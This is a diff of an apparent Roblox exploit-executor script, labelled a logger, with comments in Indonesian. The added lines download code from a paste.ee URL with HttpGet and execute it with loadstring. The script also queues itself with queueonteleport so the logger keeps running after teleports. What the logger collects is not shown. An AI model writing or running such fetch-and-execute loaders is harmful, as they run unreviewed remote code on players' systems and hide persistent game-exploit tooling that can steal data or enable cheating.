@@ -1,12 +1,19 @@
--- Logger utama
+-- [AutoExec Logger Script - Delta Executor Friendly]
+
 repeat task.wait() until game:IsLoaded()
 
--- Siapkan script yang akan di-queue saat teleport
-local teleportScript = [==[
-repeat task.wait() until game:IsLoaded()
-pcall(function()
+-- Load dan jalankan script eksternal dari paste.ee (hanya saat pertama kali)
+local success, err = pcall(function()
     loadstring(game:HttpGet("https://paste.ee/r/kEHhQbpL"))()
 end)
+
+if not success then
+    warn("Failed to load external script: " .. tostring(err))
+end
+
+-- Script logger utama sebagai string (untuk queueonteleport dan eksekusi langsung)
+local teleportScript = [==[
+repeat task.wait() until game:IsLoaded()
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -165,10 +172,10 @@ if not ok then
 end
 ]==]
 
--- Queue script agar dijalankan saat teleport
+-- Gunakan queueonteleport agar logger ini tetap aktif setelah teleport
 if queueonteleport then
     queueonteleport(teleportScript)
 end
 
--- Jalankan langsung juga sekarang
+-- Jalankan logger sekarang juga (initial instance)
 loadstring(teleportScript)()
